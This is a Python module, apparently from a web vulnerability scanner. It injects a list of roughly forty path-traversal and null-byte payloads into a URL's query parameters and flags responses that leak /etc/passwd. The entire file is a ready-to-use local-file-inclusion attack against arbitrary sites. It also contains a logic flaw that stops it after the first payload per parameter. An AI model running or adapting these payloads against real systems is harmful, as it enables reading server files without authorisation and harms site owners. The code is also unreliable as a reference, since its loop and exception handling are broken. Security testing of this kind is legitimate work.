from threading import main_thread
from requests import get


class TestLFI:
    def __init__(self, log, console) -> None:
        self.log = log
        self.console = console
        self.tested_urls = []
        self.lfi_tests = [
            r"../../../../../etc/passwd",
            r"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2"
            + r"e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            r"..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd",
            r"\\&apos;/bin/cat%20/etc/passwd\\&apos;",
            r"/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            r"/..%c0%af../..%c0%af../..%c0%af../..%c0"
            + r"%af../..%c0%af../..%c0%af../etc/passwd",
            r"/etc/default/passwd",
            r"/./././././././././././etc/passwd",
            r"/../../../../../../../../../../etc/passwd",
            r"/../../../../../../../../../../etc/passwd^^",
            r"/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd",
            r"/etc/passwd",
            r"%0a/bin/cat%20/etc/passwd",
            r"%00../../../../../../etc/passwd",
            r"%00/etc/passwd%00",
            r"../../../../../../../../../../../../"
            + r"../../../../../../../../../../etc/passwd",
            r"../../etc/passwd",
            r"../etc/passwd",
            r".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
            r"etc/passwd",
            r"/etc/passwd%00",
            r"../../../../../../../../../../../../../"
            + r"../../../../../../../../../etc/passwd%00",
            r"../../etc/passwd%00",
            r"../etc/passwd%00",
            r"/../../../../../../../../../../../etc/passwd%00.html",
            r"/../../../../../../../../../../../etc/passwd%00.jpg",
            r"/../../../../../../../../../../../etc/passwd%00.php",
            r"/../../../../../../../../../../../etc/passwd%00.txt",
            r"../../../../../../etc/passwd&=%3C%3C%3C%3C",
            r"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/"
            + r"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/"
            + r"....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd",
            r"....\\/....\\/etc/passwd",
            r"....\\/etc/passwd",
            r"....//....//....//....//....//....//....//....//"
            + r"....//....//....//....//....//....//....//"
            + r"....//....//....//....//....//....//....//etc/passwd",
            r"....//....//etc/passwd",
            r"....//etc/passwd",
            r"/etc/security/passwd",
            r"///////../../../etc/passwd",
            r"..2fetc2fpasswd",
            r"..2fetc2fpasswd%00",
            r"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f.."
            + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
            r"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f.."
            + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00",
        ]

    def exploit_lfi(self, base_url, url_params) -> None:
        for param in url_params:
            for test in self.lfi_tests:
                param_no_value = param.split("=")[0]
                main_url = f"{base_url}?{param_no_value}"

                if not main_url in self.tested_urls:
                    self.tested_urls.append(main_url)
                    test_url = f"{main_url}={test}"
                else:
                    continue

                try:
                    response = get(test_url)
                except ConnectionError:
                    self.log.logger(
                        "error", f"Connection error raised on: {test_url}, skipping"
                    )
                    continue
                else:
                    if response.text.find("root:x:0:0:root:/root") != -1:
                        self.console.print(
                            f"[red][[/red][green]+[/green][red]][/red]"
                            + f" [white]LFI :[/white] {test_url}"
                        )
                        break

    def test_lfi(self, url) -> None:
        """
        Test for LFI
        """
        base_url, params = url.split("?")[0], url.split("?")[1]
        params_dict = params.split("&")
        self.exploit_lfi(base_url, params_dict)
